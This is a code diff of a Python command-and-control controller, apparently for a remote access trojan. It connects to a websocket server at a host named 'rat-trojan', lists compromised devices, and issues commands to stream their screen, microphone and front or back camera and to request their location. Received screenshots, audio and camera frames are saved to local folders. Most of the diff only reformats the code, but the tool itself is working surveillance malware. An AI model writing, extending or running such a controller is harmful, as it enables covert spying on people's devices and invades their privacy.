@@ -14,25 +14,54 @@ import numpy as np
 # CONFIG
 # ============================================================
 
-RENDER_URL = "wss://rat-trojan.onrender.com/ws"
+RENDER_URL = (
+    "wss://rat-trojan.onrender.com/ws"
+)
 
 PC_DEVICE_ID = "pc-main"
+
 PAIRING_SECRET = "LAB-123456"
 
 RECONNECT_DELAY = 5
 
-# PC-SIDE CAMERA SNAPSHOT INTERVAL
-# Android does NOT use this value.
 CAMERA_SAVE_INTERVAL = 5.0
 
-DATA_DIR = Path("received_data")
-SCREEN_DIR = DATA_DIR / "screens"
-CAMERA_DIR = DATA_DIR / "camera"
-AUDIO_DIR = DATA_DIR / "audio"
 
-SCREEN_DIR.mkdir(parents=True, exist_ok=True)
-CAMERA_DIR.mkdir(parents=True, exist_ok=True)
-AUDIO_DIR.mkdir(parents=True, exist_ok=True)
+# ============================================================
+# DIRECTORIES
+# ============================================================
+
+DATA_DIR = Path(
+    "received_data"
+)
+
+SCREEN_DIR = (
+    DATA_DIR / "screens"
+)
+
+CAMERA_DIR = (
+    DATA_DIR / "camera"
+)
+
+AUDIO_DIR = (
+    DATA_DIR / "audio"
+)
+
+
+SCREEN_DIR.mkdir(
+    parents=True,
+    exist_ok=True
+)
+
+CAMERA_DIR.mkdir(
+    parents=True,
+    exist_ok=True
+)
+
+AUDIO_DIR.mkdir(
+    parents=True,
+    exist_ok=True
+)
 
 
 # ============================================================
@@ -42,30 +71,12 @@ AUDIO_DIR.mkdir(parents=True, exist_ok=True)
 websocket = None
 
 connected = False
+
 registered = False
 
 devices = {}
 
 running = True
-
-# ------------------------------------------------------------
-# Binary protocol state
-#
-# Render sends:
-#
-# TEXT:
-# {
-#     "type": "camera_frame",
-#     ...
-# }
-#
-# then:
-#
-# BINARY:
-# <JPEG bytes>
-#
-# We store the metadata here until the binary packet arrives.
-# ------------------------------------------------------------
 
 pending_binary_metadata = None
 
@@ -76,28 +87,26 @@ pending_binary_metadata = None
 
 camera_streams = {}
 
-# Structure:
-#
-# camera_streams[device_id] = {
-#     "active": True,
-#     "last_frame": ...,
-#     "last_saved": ...,
-#     "frame_count": ...,
-#     "window_name": ...
-# }
-
 
 # ============================================================
 # SEND JSON
 # ============================================================
 
-async def send_json(data):
+async def send_json(
+    data
+):
 
     global websocket
 
-    if websocket is None or not connected:
+    if (
+        websocket is None
+        or not connected
+    ):
 
-        print("[ERROR] Not connected to Render")
+        print(
+            "[ERROR] "
+            "Not connected to Render"
+        )
 
         return False
 
@@ -128,13 +137,15 @@ async def request_devices():
     if not registered:
 
         print(
-            "[ERROR] PC is not registered"
+            "[ERROR] "
+            "PC is not registered"
         )
 
         return
 
     await send_json({
-        "type": "list_devices"
+        "type":
+            "list_devices"
     })
 
 
@@ -142,9 +153,17 @@ def print_devices():
 
     print()
 
-    print("=" * 70)
-    print("DEVICES")
-    print("=" * 70)
+    print(
+        "=" * 70
+    )
+
+    print(
+        "DEVICES"
+    )
+
+    print(
+        "=" * 70
+    )
 
     if not devices:
 
@@ -160,21 +179,38 @@ def print_devices():
             f"{'STATUS':<12}"
         )
 
-        print("-" * 70)
+        print(
+            "-" * 70
+        )
 
         for device_id, device in devices.items():
 
-            print(
-                f"{device_id:<28}"
-                f"{device.get('device_type', 'unknown'):<12}"
-                f"{device.get('status', 'unknown'):<12}"
+            status = device.get(
+                "status",
+                "offline"
             )
 
-    print("=" * 70)
+            device_type = device.get(
+                "device_type",
+                "unknown"
+            )
+
+            print(
+                f"{device_id:<28}"
+                f"{device_type:<12}"
+                f"{status:<12}"
+            )
+
+    print(
+        "=" * 70
+    )
+
     print()
 
 
-def handle_device_list(data):
+def handle_device_list(
+    data
+):
 
     global devices
 
@@ -192,7 +228,9 @@ def handle_device_list(data):
         if not device_id:
             continue
 
-        devices[device_id] = device
+        devices[
+            device_id
+        ] = device
 
     print_devices()
 
@@ -210,13 +248,6 @@ async def send_command(
     if args is None:
         args = {}
 
-    if device_id not in devices:
-
-        print(
-            f"[WARNING] {device_id} "
-            f"is not in the known device list."
-        )
-
     command_id = (
         "cmd-" +
         uuid.uuid4().hex[:10]
@@ -224,7 +255,8 @@ async def send_command(
 
     message = {
 
-        "type": "command",
+        "type":
+            "command",
 
         "device_id":
             device_id,
@@ -239,26 +271,32 @@ async def send_command(
             args
     }
 
-    if await send_json(message):
+    if await send_json(
+        message
+    ):
 
         print()
 
         print(
-            f"[COMMAND] {command}"
+            f"[COMMAND] "
+            f"{command}"
         )
 
         print(
-            f"[TARGET]  {device_id}"
+            f"[TARGET]  "
+            f"{device_id}"
         )
 
         print(
-            f"[ID]      {command_id}"
+            f"[ID]      "
+            f"{command_id}"
         )
 
         if args:
 
             print(
-                f"[ARGS]    {args}"
+                f"[ARGS]    "
+                f"{args}"
             )
 
         print()
@@ -268,7 +306,9 @@ async def send_command(
 # DEVICE CONNECTED
 # ============================================================
 
-def handle_device_connected(data):
+def handle_device_connected(
+    data
+):
 
     device_id = data.get(
         "device_id"
@@ -277,7 +317,9 @@ def handle_device_connected(data):
     if not device_id:
         return
 
-    devices[device_id] = {
+    devices[
+        device_id
+    ] = {
 
         "device_id":
             device_id,
@@ -294,9 +336,17 @@ def handle_device_connected(data):
 
     print()
 
-    print("=" * 70)
-    print("DEVICE CONNECTED")
-    print("=" * 70)
+    print(
+        "=" * 70
+    )
+
+    print(
+        "DEVICE CONNECTED"
+    )
+
+    print(
+        "=" * 70
+    )
 
     print(
         "ID     :",
@@ -305,14 +355,18 @@ def handle_device_connected(data):
 
     print(
         "TYPE   :",
-        data.get("device_type")
+        data.get(
+            "device_type"
+        )
     )
 
     print(
         "STATUS : ONLINE"
     )
 
-    print("=" * 70)
+    print(
+        "=" * 70
+    )
 
     print()
 
@@ -321,7 +375,9 @@ def handle_device_connected(data):
 # DEVICE DISCONNECTED
 # ============================================================
 
-def handle_device_disconnected(data):
+def handle_device_disconnected(
+    data
+):
 
     device_id = data.get(
         "device_id"
@@ -334,7 +390,9 @@ def handle_device_disconnected(data):
 
         devices[
             device_id
-        ]["status"] = "offline"
+        ][
+            "status"
+        ] = "offline"
 
     stop_local_camera(
         device_id
@@ -354,7 +412,9 @@ def handle_device_disconnected(data):
 # COMMAND RESPONSE
 # ============================================================
 
-def handle_command_response(data):
+def handle_command_response(
+    data
+):
 
     device_id = data.get(
         "device_id",
@@ -377,9 +437,17 @@ def handle_command_response(data):
 
     print()
 
-    print("=" * 70)
-    print("COMMAND RESPONSE")
-    print("=" * 70)
+    print(
+        "=" * 70
+    )
+
+    print(
+        "COMMAND RESPONSE"
+    )
+
+    print(
+        "=" * 70
+    )
 
     print(
         "Device :",
@@ -412,24 +480,33 @@ def handle_command_response(data):
 
     else:
 
-        print(result)
+        print(
+            result
+        )
 
-    print("=" * 70)
+    print(
+        "=" * 70
+    )
 
     print()
 
 
 # ============================================================
-# CAMERA WINDOW
+# CAMERA
 # ============================================================
 
-def get_camera_state(device_id):
+def get_camera_state(
+    device_id
+):
 
     if device_id not in camera_streams:
 
-        camera_streams[device_id] = {
+        camera_streams[
+            device_id
+        ] = {
 
-            "active": True,
+            "active":
+                True,
 
             "last_frame":
                 0.0,
@@ -441,27 +518,37 @@ def get_camera_state(device_id):
                 0,
 
             "window_name":
-                f"JARVIS CAMERA - {device_id}"
+                f"JARVIS CAMERA - "
+                f"{device_id}"
         }
 
-    return camera_streams[device_id]
+    return camera_streams[
+        device_id
+    ]
 
 
-def start_local_camera(device_id):
+def start_local_camera(
+    device_id
+):
 
     state = get_camera_state(
         device_id
     )
 
-    state["active"] = True
+    state[
+        "active"
+    ] = True
 
     print(
-        f"[CAMERA] Local stream enabled: "
+        "[CAMERA] "
+        f"Local stream enabled: "
         f"{device_id}"
     )
 
 
-def stop_local_camera(device_id):
+def stop_local_camera(
+    device_id
+):
 
     state = camera_streams.get(
         device_id
@@ -469,12 +556,16 @@ def stop_local_camera(device_id):
 
     if state:
 
-        state["active"] = False
+        state[
+            "active"
+        ] = False
 
         try:
 
             cv2.destroyWindow(
-                state["window_name"]
+                state[
+                    "window_name"
+                ]
             )
 
         except Exception:
@@ -486,7 +577,8 @@ def stop_local_camera(device_id):
         )
 
     print(
-        f"[CAMERA] Local stream stopped: "
+        "[CAMERA] "
+        f"Local stream stopped: "
         f"{device_id}"
     )
 
@@ -514,7 +606,8 @@ def handle_camera_frame(
     if device_id == "unknown":
 
         print(
-            "[CAMERA] Frame without device ID"
+            "[CAMERA] "
+            "Frame without device ID"
         )
 
         return
@@ -523,12 +616,11 @@ def handle_camera_frame(
         device_id
     )
 
-    if not state["active"]:
-        return
+    if not state[
+        "active"
+    ]:
 
-    # --------------------------------------------------------
-    # JPEG -> OpenCV image
-    # --------------------------------------------------------
+        return
 
     try:
 
@@ -545,7 +637,8 @@ def handle_camera_frame(
         if frame is None:
 
             print(
-                "[CAMERA] Invalid JPEG frame"
+                "[CAMERA] "
+                "Invalid JPEG frame"
             )
 
             return
@@ -553,53 +646,45 @@ def handle_camera_frame(
     except Exception as e:
 
         print(
-            "[CAMERA] Decode error:",
+            "[CAMERA] "
+            "Decode error:",
             e
         )
 
         return
 
-    # --------------------------------------------------------
-    # Statistics
-    # --------------------------------------------------------
-
     now = time.monotonic()
 
-    state["last_frame"] = now
+    state[
+        "last_frame"
+    ] = now
 
-    state["frame_count"] += 1
-
-    # --------------------------------------------------------
-    # LIVE DISPLAY
-    # --------------------------------------------------------
-
-    window_name = state[
-        "window_name"
-    ]
+    state[
+        "frame_count"
+    ] += 1
 
     try:
 
         cv2.imshow(
-            window_name,
+            state[
+                "window_name"
+            ],
             frame
         )
 
-        # Required for OpenCV window events.
         cv2.waitKey(1)
 
     except Exception as e:
 
         print(
-            "[CAMERA] Display error:",
+            "[CAMERA] "
+            "Display error:",
             e
         )
 
-    # --------------------------------------------------------
-    # PC-SIDE SNAPSHOT TIMER
-    # --------------------------------------------------------
-
     if (
-        now - state["last_saved"]
+        now -
+        state["last_saved"]
         >= CAMERA_SAVE_INTERVAL
     ):
 
@@ -608,7 +693,9 @@ def handle_camera_frame(
             frame
         )
 
-        state["last_saved"] = now
+        state[
+            "last_saved"
+        ] = now
 
 
 def save_camera_snapshot(
@@ -616,9 +703,12 @@ def save_camera_snapshot(
     frame
 ):
 
-    timestamp = datetime.now().strftime(
-        "%Y%m%d_%H%M%S_%f"
-    )[:-3]
+    timestamp = (
+        datetime.now()
+        .strftime(
+            "%Y%m%d_%H%M%S_%f"
+        )[:-3]
+    )
 
     filename = (
         CAMERA_DIR /
@@ -635,7 +725,7 @@ def save_camera_snapshot(
         if success:
 
             print(
-                f"[CAMERA SNAPSHOT] "
+                "[CAMERA SNAPSHOT] "
                 f"{device_id} "
                 f"-> {filename}"
             )
@@ -643,14 +733,16 @@ def save_camera_snapshot(
         else:
 
             print(
-                "[CAMERA] Failed to save:",
-                filename
+                "[CAMERA] "
+                f"Failed to save: "
+                f"{filename}"
             )
 
     except Exception as e:
 
         print(
-            "[CAMERA] Save error:",
+            "[CAMERA] "
+            "Save error:",
             e
         )
 
@@ -691,7 +783,7 @@ def handle_screen_data(
         )
 
         print(
-            f"[SCREEN] "
+            "[SCREEN] "
             f"{device_id} "
             f"{len(binary_data)} bytes "
             f"-> {filename}"
@@ -741,7 +833,7 @@ def handle_microphone_data(
         )
 
         print(
-            f"[MIC] "
+            "[MIC] "
             f"{device_id} "
             f"{len(binary_data)} bytes "
             f"-> {filename}"
@@ -756,7 +848,7 @@ def handle_microphone_data(
 
 
 # ============================================================
-# BINARY DATA
+# BINARY
 # ============================================================
 
 async def handle_binary_data(
@@ -764,19 +856,17 @@ async def handle_binary_data(
     binary_data
 ):
 
-    packet_type = metadata.get(
-        "packet_type"
-    )
-
     stream_type = metadata.get(
         "type"
     )
 
-    # --------------------------------------------------------
-    # New protocol: type tells us the stream.
-    # --------------------------------------------------------
+    packet_type = metadata.get(
+        "packet_type"
+    )
 
-    if stream_type == "camera_frame":
+    if stream_type == (
+        "camera_frame"
+    ):
 
         handle_camera_frame(
             metadata,
@@ -785,7 +875,9 @@ async def handle_binary_data(
 
         return
 
-    if stream_type == "screen_frame":
+    if stream_type == (
+        "screen_frame"
+    ):
 
         handle_screen_data(
             metadata,
@@ -794,7 +886,9 @@ async def handle_binary_data(
 
         return
 
-    if stream_type == "microphone_chunk":
+    if stream_type == (
+        "microphone_chunk"
+    ):
 
         handle_microphone_data(
             metadata,
@@ -804,7 +898,7 @@ async def handle_binary_data(
         return
 
     # --------------------------------------------------------
-    # Compatibility with packet_type protocol
+    # Old protocol compatibility
     # --------------------------------------------------------
 
     if packet_type == 1:
@@ -831,8 +925,8 @@ async def handle_binary_data(
     else:
 
         print(
-            f"[BINARY] "
-            f"unknown type="
+            "[BINARY] "
+            f"Unknown stream type="
             f"{stream_type} "
             f"packet_type="
             f"{packet_type} "
@@ -842,12 +936,11 @@ async def handle_binary_data(
 
 
 # ============================================================
-# RECEIVE LOOP
+# RECEIVER
 # ============================================================
 
 async def receiver_loop():
 
-    global websocket
     global pending_binary_metadata
 
     pending_binary_metadata = None
@@ -856,7 +949,9 @@ async def receiver_loop():
 
         while connected:
 
-            message = await websocket.recv()
+            message = (
+                await websocket.recv()
+            )
 
             # =================================================
             # BINARY
@@ -867,23 +962,20 @@ async def receiver_loop():
                 bytes
             ):
 
-                if len(message) == 0:
+                if not message:
                     continue
 
-                # ------------------------------------------------
-                # New protocol
-                #
-                # Metadata was received immediately before
-                # this binary packet.
-                # ------------------------------------------------
-
-                if pending_binary_metadata:
+                if (
+                    pending_binary_metadata
+                ):
 
                     metadata = (
                         pending_binary_metadata
                     )
 
-                    pending_binary_metadata = None
+                    pending_binary_metadata = (
+                        None
+                    )
 
                     await handle_binary_data(
                         metadata,
@@ -892,31 +984,10 @@ async def receiver_loop():
 
                     continue
 
-                # ------------------------------------------------
-                # Old protocol compatibility:
-                #
-                # [packet_type][data]
-                # ------------------------------------------------
-
-                if len(message) < 2:
-                    continue
-
-                packet_type = message[0]
-
-                binary_data = message[1:]
-
-                metadata = {
-
-                    "device_id":
-                        "unknown",
-
-                    "packet_type":
-                        packet_type
-                }
-
-                await handle_binary_data(
-                    metadata,
-                    binary_data
+                print(
+                    "[BINARY] "
+                    "Received binary "
+                    "without metadata"
                 )
 
                 continue
@@ -945,7 +1016,7 @@ async def receiver_loop():
             )
 
             # =================================================
-            # NEW BINARY METADATA
+            # STREAM METADATA
             # =================================================
 
             if message_type in (
@@ -954,42 +1025,26 @@ async def receiver_loop():
                 "microphone_chunk"
             ):
 
-                pending_binary_metadata = data
-
-                continue
-
-            # =================================================
-            # OLD BINARY METADATA
-            # =================================================
-
-            if message_type == "binary_data":
-
-                pending_binary_metadata = data
-
-                print(
-                    "[STREAM]",
-                    "device=",
-                    data.get("device_id"),
-                    "packet_type=",
-                    data.get("packet_type"),
-                    "size=",
-                    data.get("size")
+                pending_binary_metadata = (
+                    data
                 )
 
                 continue
 
             # =================================================
-            # DEVICE LIST
+            # DEVICES
             # =================================================
 
-            if message_type == "devices":
+            if message_type == (
+                "devices"
+            ):
 
                 handle_device_list(
                     data
                 )
 
             # =================================================
-            # DEVICE CONNECTED
+            # CONNECTED
             # =================================================
 
             elif message_type in (
@@ -1002,7 +1057,7 @@ async def receiver_loop():
                 )
 
             # =================================================
-            # DEVICE DISCONNECTED
+            # DISCONNECTED
             # =================================================
 
             elif message_type in (
@@ -1018,33 +1073,40 @@ async def receiver_loop():
             # COMMAND RESPONSE
             # =================================================
 
-            elif message_type == "command_response":
+            elif message_type == (
+                "command_response"
+            ):
 
                 handle_command_response(
                     data
                 )
 
             # =================================================
-            # REGISTER
+            # PC REGISTER
             # =================================================
 
-            elif message_type == "pc_register_response":
+            elif message_type == (
+                "pc_register_response"
+            ):
 
-                if data.get("success"):
+                if data.get(
+                    "success"
+                ):
 
                     print(
                         "[RENDER] "
-                        "PC registered successfully"
+                        "PC registered "
+                        "successfully"
                     )
 
                 else:
 
                     print(
                         "[RENDER] "
-                        "PC registration failed:",
+                        "PC registration "
+                        "failed:",
                         data.get(
-                            "message",
-                            data.get("error")
+                            "message"
                         )
                     )
 
@@ -1052,7 +1114,9 @@ async def receiver_loop():
             # HEARTBEAT
             # =================================================
 
-            elif message_type == "heartbeat_ack":
+            elif message_type == (
+                "heartbeat_ack"
+            ):
 
                 pass
 
@@ -1060,7 +1124,9 @@ async def receiver_loop():
             # PONG
             # =================================================
 
-            elif message_type == "pong":
+            elif message_type == (
+                "pong"
+            ):
 
                 pass
 
@@ -1068,19 +1134,16 @@ async def receiver_loop():
             # ERROR
             # =================================================
 
-            elif message_type == "error":
+            elif message_type == (
+                "error"
+            ):
 
                 print(
                     "[RENDER ERROR]",
                     data.get(
-                        "message",
-                        data.get("error")
+                        "message"
                     )
                 )
-
-            # =================================================
-            # UNKNOWN
-            # =================================================
 
             else:
 
@@ -1115,13 +1178,16 @@ async def heartbeat_loop():
 
         try:
 
-            await asyncio.sleep(10)
+            await asyncio.sleep(
+                10
+            )
 
             if not connected:
                 break
 
             await send_json({
-                "type": "heartbeat"
+                "type":
+                    "heartbeat"
             })
 
         except asyncio.CancelledError:
@@ -1139,7 +1205,7 @@ async def heartbeat_loop():
 
 
 # ============================================================
-# REGISTER PC
+# REGISTER
 # ============================================================
 
 async def register_pc():
@@ -1161,7 +1227,7 @@ async def register_pc():
 
 
 # ============================================================
-# CONNECT
+# CONNECTION
 # ============================================================
 
 async def connect_to_render():
@@ -1173,7 +1239,6 @@ async def connect_to_render():
     try:
 
         print()
-
         print(
             "[RENDER] Connecting..."
         )
@@ -1200,7 +1265,10 @@ async def connect_to_render():
 
             await register_pc()
 
-            registered = True
+            # IMPORTANT:
+            # We wait for pc_register_response.
+            # receiver_loop will receive it.
+            # For now the connection is alive.
 
             receiver_task = (
                 asyncio.create_task(
@@ -1220,8 +1288,9 @@ async def connect_to_render():
                         receiver_task,
                         heartbeat_task
                     ],
-                    return_when=
+                    return_when=(
                         asyncio.FIRST_COMPLETED
+                    )
                 )
             )
 
@@ -1244,7 +1313,6 @@ async def connect_to_render():
 
         websocket = None
 
-        # Close local camera windows.
         for device_id in list(
             camera_streams.keys()
         ):
@@ -1269,11 +1337,17 @@ async def controller_cli():
 
     print()
 
-    print("=" * 70)
+    print(
+        "=" * 70
+    )
+
     print(
         "             JARVIS CLOUD CONTROLLER"
     )
-    print("=" * 70)
+
+    print(
+        "=" * 70
+    )
 
     print(
         "Type 'help' for commands."
@@ -1296,7 +1370,6 @@ async def controller_cli():
         ):
 
             running = False
-
             return
 
         line = line.strip()
@@ -1306,98 +1379,126 @@ async def controller_cli():
 
         parts = line.split()
 
-        command = parts[0].lower()
+        command = (
+            parts[0].lower()
+        )
 
-        # ====================================================
+        # ----------------------------------------------------
         # HELP
-        # ====================================================
+        # ----------------------------------------------------
 
         if command == "help":
 
             print()
 
-            print("devices")
-            print("refresh")
-            print()
-
-            print("info <device_id>")
-            print("battery <device_id>")
-            print("status <device_id>")
-            print("location <device_id>")
-            print()
-
-            print("screen-start <device_id>")
-            print("screen-stop <device_id>")
-            print()
-
-            print("microphone-start <device_id>")
-            print("microphone-stop <device_id>")
-            print()
-
-            print("camera-start <device_id>")
-            print("camera-stop <device_id>")
-            print("camera-front <device_id>")
-            print("camera-back <device_id>")
-            print("camera-switch <device_id>")
-            print()
-
             print(
-                "camera-interval "
-                "<seconds>"
+                "devices"
             )
 
             print(
-                "camera-interval "
-                "<device_id> <seconds>"
+                "refresh"
             )
 
             print()
 
-            print("clear")
-            print("exit")
+            print(
+                "info <device_id>"
+            )
+
+            print(
+                "battery <device_id>"
+            )
+
+            print(
+                "status <device_id>"
+            )
+
+            print(
+                "location <device_id>"
+            )
 
             print()
 
-        # ====================================================
-        # CLEAR
-        # ====================================================
-
-        elif command == "clear":
-
-            import os
-
-            os.system(
-                "cls"
-                if os.name == "nt"
-                else "clear"
+            print(
+                "screen-start <device_id>"
             )
 
-        # ====================================================
+            print(
+                "screen-stop <device_id>"
+            )
+
+            print()
+
+            print(
+                "microphone-start <device_id>"
+            )
+
+            print(
+                "microphone-stop <device_id>"
+            )
+
+            print()
+
+            print(
+                "camera-start <device_id>"
+            )
+
+            print(
+                "camera-stop <device_id>"
+            )
+
+            print(
+                "camera-front <device_id>"
+            )
+
+            print(
+                "camera-back <device_id>"
+            )
+
+            print(
+                "camera-switch <device_id>"
+            )
+
+            print()
+
+            print(
+                "camera-interval <seconds>"
+            )
+
+            print()
+
+            print(
+                "clear"
+            )
+
+            print(
+                "exit"
+            )
+
+            print()
+
+        # ----------------------------------------------------
         # DEVICES
-        # ====================================================
+        # ----------------------------------------------------
 
-        elif command == "devices":
-
-            await request_devices()
-
-        # ====================================================
-        # REFRESH
-        # ====================================================
-
-        elif command == "refresh":
+        elif command in (
+            "devices",
+            "refresh"
+        ):
 
             await request_devices()
 
-        # ====================================================
+        # ----------------------------------------------------
         # INFO
-        # ====================================================
+        # ----------------------------------------------------
 
         elif command == "info":
 
             if len(parts) < 2:
 
                 print(
-                    "Usage: info <device_id>"
+                    "Usage: "
+                    "info <device_id>"
                 )
 
                 continue
@@ -1407,16 +1508,17 @@ async def controller_cli():
                 "device_info"
             )
 
-        # ====================================================
+        # ----------------------------------------------------
         # BATTERY
-        # ====================================================
+        # ----------------------------------------------------
 
         elif command == "battery":
 
             if len(parts) < 2:
 
                 print(
-                    "Usage: battery <device_id>"
+                    "Usage: "
+                    "battery <device_id>"
                 )
 
                 continue
@@ -1426,16 +1528,17 @@ async def controller_cli():
                 "battery_status"
             )
 
-        # ====================================================
+        # ----------------------------------------------------
         # STATUS
-        # ====================================================
+        # ----------------------------------------------------
 
         elif command == "status":
 
             if len(parts) < 2:
 
                 print(
-                    "Usage: status <device_id>"
+                    "Usage: "
+                    "status <device_id>"
                 )
 
                 continue
@@ -1445,16 +1548,17 @@ async def controller_cli():
                 "connection_status"
             )
 
-        # ====================================================
+        # ----------------------------------------------------
         # LOCATION
-        # ====================================================
+        # ----------------------------------------------------
 
         elif command == "location":
 
             if len(parts) < 2:
 
                 print(
-                    "Usage: location <device_id>"
+                    "Usage: "
+                    "location <device_id>"
                 )
 
                 continue
@@ -1464,16 +1568,17 @@ async def controller_cli():
                 "location_request"
             )
 
-        # ====================================================
-        # SCREEN START
-        # ====================================================
+        # ----------------------------------------------------
+        # SCREEN
+        # ----------------------------------------------------
 
         elif command == "screen-start":
 
             if len(parts) < 2:
 
                 print(
-                    "Usage: screen-start <device_id>"
+                    "Usage: "
+                    "screen-start <device_id>"
                 )
 
                 continue
@@ -1483,16 +1588,13 @@ async def controller_cli():
                 "start_screen"
             )
 
-        # ====================================================
-        # SCREEN STOP
-        # ====================================================
-
         elif command == "screen-stop":
 
             if len(parts) < 2:
 
                 print(
-                    "Usage: screen-stop <device_id>"
+                    "Usage: "
+                    "screen-stop <device_id>"
                 )
 
                 continue
@@ -1502,16 +1604,17 @@ async def controller_cli():
                 "stop_screen"
             )
 
-        # ====================================================
-        # MICROPHONE START
-        # ====================================================
+        # ----------------------------------------------------
+        # MICROPHONE
+        # ----------------------------------------------------
 
         elif command == "microphone-start":
 
             if len(parts) < 2:
 
                 print(
-                    "Usage: microphone-start "
+                    "Usage: "
+                    "microphone-start "
                     "<device_id>"
                 )
 
@@ -1522,16 +1625,13 @@ async def controller_cli():
                 "start_microphone"
             )
 
-        # ====================================================
-        # MICROPHONE STOP
-        # ====================================================
-
         elif command == "microphone-stop":
 
             if len(parts) < 2:
 
                 print(
-                    "Usage: microphone-stop "
+                    "Usage: "
+                    "microphone-stop "
                     "<device_id>"
                 )
 
@@ -1542,16 +1642,17 @@ async def controller_cli():
                 "stop_microphone"
             )
 
-        # ====================================================
-        # CAMERA START
-        # ====================================================
+        # ----------------------------------------------------
+        # CAMERA
+        # ----------------------------------------------------
 
         elif command == "camera-start":
 
             if len(parts) < 2:
 
                 print(
-                    "Usage: camera-start "
+                    "Usage: "
+                    "camera-start "
                     "<device_id>"
                 )
 
@@ -1568,16 +1669,13 @@ async def controller_cli():
                 "start_camera"
             )
 
-        # ====================================================
-        # CAMERA STOP
-        # ====================================================
-
         elif command == "camera-stop":
 
             if len(parts) < 2:
 
                 print(
-                    "Usage: camera-stop "
+                    "Usage: "
+                    "camera-stop "
                     "<device_id>"
                 )
 
@@ -1594,16 +1692,13 @@ async def controller_cli():
                 device_id
             )
 
-        # ====================================================
-        # CAMERA FRONT
-        # ====================================================
-
         elif command == "camera-front":
 
             if len(parts) < 2:
 
                 print(
-                    "Usage: camera-front "
+                    "Usage: "
+                    "camera-front "
                     "<device_id>"
                 )
 
@@ -1614,16 +1709,13 @@ async def controller_cli():
                 "camera_front"
             )
 
-        # ====================================================
-        # CAMERA BACK
-        # ====================================================
-
         elif command == "camera-back":
 
             if len(parts) < 2:
 
                 print(
-                    "Usage: camera-back "
+                    "Usage: "
+                    "camera-back "
                     "<device_id>"
                 )
 
@@ -1634,16 +1726,13 @@ async def controller_cli():
                 "camera_back"
             )
 
-        # ====================================================
-        # CAMERA SWITCH
-        # ====================================================
-
         elif command == "camera-switch":
 
             if len(parts) < 2:
 
                 print(
-                    "Usage: camera-switch "
+                    "Usage: "
+                    "camera-switch "
                     "<device_id>"
                 )
 
@@ -1654,106 +1743,66 @@ async def controller_cli():
                 "camera_switch"
             )
 
-        # ====================================================
+        # ----------------------------------------------------
         # CAMERA INTERVAL
-        # ====================================================
+        # ----------------------------------------------------
 
-        elif command == "camera-interval":
+        elif command == (
+            "camera-interval"
+        ):
 
-            # ------------------------------------------------
-            # camera-interval 5
-            #
-            # changes global interval
-            #
-            # ------------------------------------------------
-
-            if len(parts) == 2:
-
-                try:
-
-                    interval = float(
-                        parts[1]
-                    )
-
-                    if interval <= 0:
-                        raise ValueError
-
-                    CAMERA_SAVE_INTERVAL = (
-                        interval
-                    )
-
-                    print(
-                        "[CAMERA] Snapshot "
-                        f"interval = "
-                        f"{interval:.1f} seconds"
-                    )
-
-                except ValueError:
-
-                    print(
-                        "Usage: "
-                        "camera-interval "
-                        "<seconds>"
-                    )
-
-            # ------------------------------------------------
-            # camera-interval device-id 10
-            #
-            # Currently sets the global PC
-            # snapshot policy after validating
-            # the device.
-            # ------------------------------------------------
-
-            elif len(parts) >= 3:
-
-                device_id = parts[1]
-
-                try:
-
-                    interval = float(
-                        parts[2]
-                    )
-
-                    if interval <= 0:
-                        raise ValueError
-
-                    CAMERA_SAVE_INTERVAL = (
-                        interval
-                    )
-
-                    print(
-                        "[CAMERA] "
-                        f"{device_id} "
-                        "snapshot interval = "
-                        f"{interval:.1f} seconds"
-                    )
-
-                except ValueError:
-
-                    print(
-                        "Usage: "
-                        "camera-interval "
-                        "<device_id> <seconds>"
-                    )
-
-            else:
+            if len(parts) != 2:
 
                 print(
-                    "Usage:"
-                )
-
-                print(
-                    "camera-interval <seconds>"
-                )
-
-                print(
+                    "Usage: "
                     "camera-interval "
-                    "<device_id> <seconds>"
+                    "<seconds>"
                 )
 
-        # ====================================================
+                continue
+
+            try:
+
+                interval = float(
+                    parts[1]
+                )
+
+                if interval <= 0:
+                    raise ValueError
+
+                CAMERA_SAVE_INTERVAL = (
+                    interval
+                )
+
+                print(
+                    "[CAMERA] "
+                    "Snapshot interval = "
+                    f"{interval:.1f}s"
+                )
+
+            except ValueError:
+
+                print(
+                    "Invalid interval."
+                )
+
+        # ----------------------------------------------------
+        # CLEAR
+        # ----------------------------------------------------
+
+        elif command == "clear":
+
+            import os
+
+            os.system(
+                "cls"
+                if os.name == "nt"
+                else "clear"
+            )
+
+        # ----------------------------------------------------
         # EXIT
-        # ====================================================
+        # ----------------------------------------------------
 
         elif command == "exit":
 
@@ -1766,7 +1815,8 @@ async def controller_cli():
         else:
 
             print(
-                f"Unknown command: {command}"
+                f"Unknown command: "
+                f"{command}"
             )
 
 
@@ -1803,7 +1853,9 @@ async def main():
 
         else:
 
-            await asyncio.sleep(1)
+            await asyncio.sleep(
+                1
+            )
 
     if not cli_task.done():
 
@@ -1816,8 +1868,6 @@ async def main():
         except asyncio.CancelledError:
 
             pass
-
-    # Close OpenCV windows.
 
     for device_id in list(
         camera_streams.keys()
